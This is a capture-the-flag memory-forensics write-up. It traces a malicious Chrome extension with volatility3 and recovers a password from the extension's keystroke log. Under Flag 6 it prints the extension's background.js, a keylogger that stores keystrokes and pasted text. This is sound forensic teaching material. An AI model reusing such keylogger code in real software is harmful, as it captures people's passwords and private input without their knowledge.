# Stealth Invasion
### Selene's normally secure laptop recently fell victim to a covert attack. Unbeknownst to her, a malicious Chrome extension was stealthily installed, masquerading as a useful productivity tool. Alarmed by unusual network activity, Selene is now racing against time to trace the intrusion, remove the malicious software, and bolster her digital defenses before more damage is done.

When we open the challenge, we're immediately confronted with a **memdump.elf** file. There's no need to look far to find out what to do.

I start volatility3, then run: `python3 vol.py -f memdump.elf windows.info` to get some basic information.

![imageinfo](https://github.com/user-attachments/assets/55e85d2d-3a48-4bc0-a0b2-0f6d6c2c2456)

### Flag 1 : What is the PID of the original Google Chrome process ?

With a simple command : 
```bash
python3 vol.py -f memdump.elf windows.pslist | grep 'chrome.exe'
``` 
Leads us to this : 

![image chrome](https://github.com/user-attachments/assets/1d74d818-e5be-40cd-865b-9ed4c2b8e3a8)

### Flag 2 : What is the only folder on the Desktop ?

This time we dig a little into the files with :
```bash 
python3 vol.py -f memdump.elf windows.filescan | grep '\Desktop'
``` 
To find :

![desktop](https://github.com/user-attachments/assets/a324da96-43e1-44f2-9ec3-ebef76df7d24)

### Flag 3 : What is the Extention's ID ?

To find the extension ID, simply look in the "Default" folder of Google Chrome where all extension IDs are stored. We do this with :
```bash
python3 vol.py -f memdump.elf windows.filescan | grep '\Users\selene\AppData\Local\Google\Chrome\User Data\Default\'
```

![id](https://github.com/user-attachments/assets/29b52914-ea50-4771-b623-3add44fa8266)

### Flag 4 : After examining the malicious extention's code, what is the log filename in which the datais stored ?

Well, for this one, we could dump the extension to study it, but given that the command before us revealed a `000003.log` file, we don't really need to look any further than that.

### Flag 5 : What is the URL the user navigated to ?

Now that we know where the log file is, we can dump it.
```bash
python3 vol.py -f memdump.elf windows.dumpfiles –virtaddr 0x708caba14d0 
```

![logg](https://github.com/user-attachments/assets/887d8bc8-a817-45f2-be3f-db036c1fe9d1)

But since the file was difficult to read, I directly dumped the History file
from Google : 

![history google](https://github.com/user-attachments/assets/818eda20-ef27-4354-a759-c8078fcc69d1)

The file being a database, to see the last URL you just need to make a simple SQL query :
```sql
SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC;
```
Or simply open the file with DB Browser :  

![last url](https://github.com/user-attachments/assets/81a67d84-0fe4-4acc-a650-b1ed4b9bf2d9)

### Flag 6 : What is the password of selene@rangers.eldoria.com ?
It's time to dive deeper into this nasty extension. We're going to dump everything about it to analyze everything.

![dumpaa](https://github.com/user-attachments/assets/552d1745-f44f-461a-9a2b-a4dac9074d04)
![flag6num2](https://github.com/user-attachments/assets/498c9a01-67dd-429d-9f05-c459f5eb441b)

After analysis, we see that the `background.js` file is a **keylogger** which adds `\r\n` in the logs each time something is copied or the enter key is pressed :
```javascript
function addLog(s) {
    
    if (s.length != 1 && s !== "Enter" && !s.startsWith("PASTE"))  {
        s = `|${s}|`;
    } else if (s === "Enter" || s.startsWith("PASTE")) {
        s = s + "\r\n";
    }

    chrome.storage.local.get(["log"]).then((data) => {
        if (!data.log) {
            data.log = "";
        }

        data.log += s;

        chrome.storage.local.set({ 'log': data.log });
    });
}


chrome.runtime.onConnect.addListener((port) => {

    console.assert(port.name === "conn");
    console.log("v1.2.1");

    port.onMessage.addListener( ({ type, data }) => {
        if (type === 'key') {
            addLog(data);
        } else if (type == 'paste') {
            addLog('PASTE:' + data);
        }
    });
});

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if (request.check === "replace_html" && chrome.storage.local.get("replace_html")) {
            sendResponse({ url: chrome.storage.local.get('replace_html_url')});
        }
    }
);
```
We then dump the log file, do a bit of sorting to make it easier to read, and then :

![log file](https://github.com/user-attachments/assets/b26627c4-e280-447c-9d05-7bbb54392511)

We finally see the password **`clip-mummify-proofs`** at the end of the file.

And with that, that gives us 6/6 flags. So the challenge is complete !
